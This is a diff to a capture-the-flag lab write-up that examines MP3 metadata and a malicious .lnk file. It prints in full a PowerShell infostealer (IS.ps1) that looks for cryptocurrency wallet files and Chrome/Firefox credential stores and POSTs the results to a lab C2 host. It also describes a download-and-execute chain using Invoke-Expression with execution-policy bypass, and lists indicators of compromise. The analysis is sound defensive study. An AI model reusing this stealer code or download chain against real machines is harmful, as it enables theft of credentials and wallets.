@@ -15,11 +15,50 @@
   - ID3 version 2.3.0
   - MPEG ADTS, layer III, v1
   - Bitrate: 192 kbps, 44.1 kHz, Stereo
+  - Artist: Tyler Ramsbey
+  - Album: Rap
+  - Genre: Rock
+  - Title: Mount HackIt
 - No suspicious activity detected during initial inspection.
 - Evidence:
 ```┌──(intrusus㉿attck)-[~/Downloads/TryHackMe/Day1]
 └─$ file song.mp3          
 song.mp3: Audio file with ID3 version 2.3.0, contains: MPEG ADTS, layer III, v1, 192 kbps, 44.1 kHz, Stereo
+```
+```┌──(intrusus㉿attck)-[~/Downloads/TryHackMe/Day1]
+└─$ exiftool song.mp3 
+ExifTool Version Number         : 13.00
+File Name                       : song.mp3
+Directory                       : .
+File Size                       : 4.6 MB
+File Modification Date/Time     : 2024:10:24 10:50:46+02:00
+File Access Date/Time           : 2024:12:16 11:50:54+01:00
+File Inode Change Date/Time     : 2024:12:16 11:46:49+01:00
+File Permissions                : -rwxrwxr-x
+File Type                       : MP3
+File Type Extension             : mp3
+MIME Type                       : audio/mpeg
+MPEG Audio Version              : 1
+Audio Layer                     : 3
+Audio Bitrate                   : 192 kbps
+Sample Rate                     : 44100
+Channel Mode                    : Stereo
+MS Stereo                       : Off
+Intensity Stereo                : Off
+Copyright Flag                  : False
+Original Media                  : False
+Emphasis                        : None
+ID3 Size                        : 2176
+Artist                          : Tyler Ramsbey
+Album                           : Rap
+Title                           : Mount HackIt
+Encoded By                      : Mixcraft 10.5 Recording Studio Build 621
+Year                            : 2024
+Genre                           : Rock
+Track                           : 0/1
+Comment                         : 
+Date/Time Original              : 2024
+Duration                        : 0:03:11 (approx)
 ```
 
 ### **somg.mp3**
@@ -195,6 +234,113 @@ Data block: 4
 - The `.lnk` file targets the PowerShell executable and uses encoded commands to bypass execution policies and download a malicious script (`IS.ps1`) from:
   - **URL:** `https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1`
 - The script is saved locally to `C:\ProgramData\s.ps1` and executed using `iex` (Invoke-Expression).
-- The script 
+- Execution Policy: **Bypass**
+- PowerShell Command: Creates a WebClient object to download a malicious payload and executes it directly.
+- The URL in the PowerShell command indicates an attempt to connect to GitHub for payload delivery. Further inspection is needed to analyze `IS.ps1`.
 
-![image](https://github.com/user-attachments/assets/c4fcba26-9855-4666-80a8-a4413f13798c)
+## **PowerShell Script Analysis**
+```powershell                       
+function Print-AsciiArt {
+    Write-Host "  ____     _       ___  _____    ___    _   _ "
+    Write-Host " / ___|   | |     |_ _||_   _|  / __|  | | | |"  
+    Write-Host "| |  _    | |      | |   | |   | |     | |_| |"
+    Write-Host "| |_| |   | |___   | |   | |   | |__   |  _  |"
+    Write-Host " \____|   |_____| |___|  |_|    \___|  |_| |_|"
+
+    Write-Host "         Created by the one and only M.M."
+}
+
+# Call the function to print the ASCII art
+Print-AsciiArt
+
+# Path for the info file
+$infoFilePath = "stolen_info.txt"
+
+# Function to search for wallet files
+function Search-ForWallets {
+    $walletPaths = @(
+        "$env:USERPROFILE\.bitcoin\wallet.dat",
+        "$env:USERPROFILE\.ethereum\keystore\*",
+        "$env:USERPROFILE\.monero\wallet",
+        "$env:USERPROFILE\.dogecoin\wallet.dat"
+    )
+    Add-Content -Path $infoFilePath -Value "`n### Crypto Wallet Files ###"
+    foreach ($path in $walletPaths) {
+        if (Test-Path $path) {
+            Add-Content -Path $infoFilePath -Value "Found wallet: $path"
+        }
+    }
+}
+
+# Function to search for browser credential files (SQLite databases)
+function Search-ForBrowserCredentials {
+    $chromePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
+    $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json"
+
+    Add-Content -Path $infoFilePath -Value "`n### Browser Credential Files ###"
+    if (Test-Path $chromePath) {
+        Add-Content -Path $infoFilePath -Value "Found Chrome credentials: $chromePath"
+    }
+    if (Test-Path $firefoxPath) {
+        Add-Content -Path $infoFilePath -Value "Found Firefox credentials: $firefoxPath"
+    }
+}
+
+# Function to send the stolen info to a C2 server
+function Send-InfoToC2Server {
+    $c2Url = "http://papash3ll.thm/data"
+    $data = Get-Content -Path $infoFilePath -Raw
+
+    # Using Invoke-WebRequest to send data to the C2 server
+    Invoke-WebRequest -Uri $c2Url -Method Post -Body $data
+}
+
+# Main execution flow
+Search-ForWallets
+Search-ForBrowserCredentials
+Send-InfoToC2Server
+```
+### **1. Overview**
+The PowerShell script (`IS.ps1`) is designed to:
+- Search for cryptocurrency wallet files.
+- Locate browser credential files.
+- Exfiltrate collected data to a Command and Control (C2) server.
+
+### **2. Detailed Functions**
+#### **Search-ForWallets**
+- **Purpose:** Locates wallet files for popular cryptocurrencies such as Bitcoin, Ethereum, Monero, and Dogecoin.
+- **Target Paths:**
+  - `$env:USERPROFILE\.bitcoin\wallet.dat`
+  - `$env:USERPROFILE\.ethereum\keystore\*`
+  - `$env:USERPROFILE\.monero\wallet`
+  - `$env:USERPROFILE\.dogecoin\wallet.dat`
+
+#### **Search-ForBrowserCredentials**
+- **Purpose:** Identifies browser credential storage files for Chrome and Firefox.
+- **Target Paths:**
+  - Chrome: `$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data`
+  - Firefox: `$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json`
+
+#### **Send-InfoToC2Server**
+- **Purpose:** Reads the collected data from `stolen_info.txt` and sends it to the C2 server.
+- **C2 URL:** `http://papash3ll.thm/data`
+
+### **3. Execution Flow**
+1. Calls `Search-ForWallets` to locate wallet files and logs findings.
+2. Calls `Search-ForBrowserCredentials` to locate credential files and logs findings.
+3. Calls `Send-InfoToC2Server` to exfiltrate the collected data.
+
+## **Indicators of Compromise (IOCs)**
+### **File System Artifacts**
+- `stolen_info.txt` in the current working directory.
+- Searched wallet file paths:
+  - Bitcoin: `wallet.dat`
+  - Ethereum: `keystore`
+  - Monero: `wallet`
+  - Dogecoin: `wallet.dat`
+- Browser credential file paths:
+  - Chrome: `Login Data`
+  - Firefox: `logins.json`
+
+### **Network Artifacts**
+- C2 URL: `http://papash3ll.thm/data`
